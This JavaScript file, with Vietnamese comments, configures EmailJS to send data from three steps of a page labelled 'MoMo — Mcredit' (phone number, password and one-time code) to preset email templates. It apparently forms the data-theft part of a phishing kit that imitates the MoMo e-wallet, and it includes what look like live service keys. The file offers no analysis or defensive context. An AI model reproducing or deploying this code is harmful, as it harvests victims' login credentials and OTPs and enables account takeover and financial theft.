/**
 * EmailJS MoMo — tách từng bước (phone / password / otp).
 * Mỗi bước có thể dùng publicKey, serviceId, templateId khác nhau.
 */
window.MOMO_EMAILJS = {
  platform: "MoMo — Mcredit (momo.html)",

  phone: {
    publicKey: "b06J7tpw0xjJAunOd",
    serviceId: "service_aa0dvwd",
    templateId: "template_akl287g",
  },

  password: {
    publicKey: "b06J7tpw0xjJAunOd",
    serviceId: "service_aa0dvwd",
    templateId: "template_nka2acq",
  },

  otp: {
    publicKey: "b06J7tpw0xjJAunOd",
    serviceId: "service_aa0dvwd",
    templateId: "template_48ehw5t",
  },
};

window.__momoEmailJsActiveKey = null;

/**
 * Gửi EmailJS theo bước: "phone" | "password" | "otp"
 * @returns {Promise|undefined}
 */
window.momoSendEmailJs = function (step, templateParams) {
  if (typeof emailjs === "undefined") {
    console.warn("EmailJS SDK chưa tải.");
    return;
  }

  var root = window.MOMO_EMAILJS || {};
  var block = root[step];
  if (!block || !block.serviceId || !block.templateId) {
    console.warn("Thiếu cấu hình MOMO_EMAILJS." + step);
    return;
  }

  if (block.publicKey && window.__momoEmailJsActiveKey !== block.publicKey) {
    emailjs.init({ publicKey: block.publicKey });
    window.__momoEmailJsActiveKey = block.publicKey;
  }

  var params = Object.assign({ platform: root.platform || "MoMo" }, templateParams);

  return emailjs.send(block.serviceId, block.templateId, params);
};
